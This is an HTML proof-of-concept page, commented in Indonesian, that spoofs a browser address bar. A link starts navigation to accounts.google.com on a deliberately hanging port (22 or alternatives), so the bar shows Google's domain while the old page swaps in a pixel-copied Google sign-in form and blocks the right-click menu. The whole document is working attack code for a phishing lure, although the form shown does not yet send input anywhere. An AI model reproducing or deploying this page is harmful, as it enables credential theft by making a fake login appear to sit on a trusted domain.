<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Halaman Uji</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { width: 100%; height: 100%; font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #fafafa; }
  #landing {
    height: 100%; display: flex; align-items: center; justify-content: center;
  }
  #landing a { font-size: 20px; color: #1a73e8; text-decoration: underline; cursor: pointer; }

  /* Form palsu, hidden sampai navigasi dimulai */
  #fake { display: none; height: 100%; background: #fff; padding-top: 90px; }
  .card {
    width: 448px; max-width: 92%; margin: 0 auto;
    border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px;
  }
  .logo { display: flex; justify-content: center; margin-bottom: 16px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 8px; }
  p.sub { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 32px; }
  .input {
    width: 100%; height: 54px; border: 1px solid #dadce0; border-radius: 4px;
    padding: 0 16px; font-size: 16px; outline: none; margin-bottom: 16px;
  }
  .row { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; }
  a.link { color: #1a73e8; font-size: 14px; text-decoration: none; }
  button.next {
    background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
    border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
  }
</style>
</head>
<body>

  <div id="landing"><a id="go">Click here</a></div>

  <div id="fake">
    <div class="card">
      <div class="logo">
        <svg width="92" height="30" viewBox="0 0 272 92"><path fill="#EA4335" d="M115 43c0-18 15-32 33-32 18 0 33 14 33 32s-15 32-33 32c-18 0-33-14-33-32zm18 0c0 9 7 16 15 16s15-7 15-16-7-16-15-16-15 7-15 16z"/><path fill="#FBBC05" d="M59 43c0-18 15-32 33-32 18 0 33 14 33 32s-15 32-33 32c-18 0-33-14-33-32zm18 0c0 9 7 16 15 16s15-7 15-16-7-16-15-16-15 7-15 16z"/><path fill="#4285F4" d="M115 8v63h17V8h-17zm9 39l-11 9 26 23h22L124 47z"/><path fill="#34A853" d="M212 8v63h17V26h17l3-18h-20V2h-17v6z"/><path fill="#EA4335" d="M255 43c0-18 15-32 33-32s33 14 33 32-15 32-33 32-33-14-33-32zm18 0c0 9 7 16 15 16s15-7 15-16-7-16-15-16-15 7-15 16z"/></svg>
      </div>
      <h1>Masuk</h1>
      <p class="sub">Gunakan Akun Google Anda</p>
      <input class="input" type="email" placeholder="Email atau ponsel">
      <a class="link" href="#">Lupa email?</a>
      <div class="row">
        <a class="link" href="#">Buat akun</a>
        <button class="next">Lanjutkan</button>
      </div>
    </div>
  </div>

<script>
  // WAJIB: port harus hang. Tes manual dulu di tab baru sampai ketemu
  // port yang spinner-nya muter lama. Kandidat: 22, 25, 445, 6667.
  const TARGET = 'https://accounts.google.com:22/v3/signin/identifier?flowName=GlifWebSignIn';

  document.getElementById('go').addEventListener('click', (e) => {
    e.preventDefault();
    // 1. Navigasi mulai -> address bar berubah ke accounts.google.com:22
    location.assign(TARGET);
    // 2. Setelah navigasi pending, render form palsu di dokumen lama
    //    (dokumen lama tetap hidup selama koneksi hang)
    setTimeout(() => {
      document.getElementById('landing').style.display = 'none';
      document.getElementById('fake').style.display = 'block';
    }, 30);
  });

  document.addEventListener('contextmenu', e => e.preventDefault());
</script>
</body>
</html>
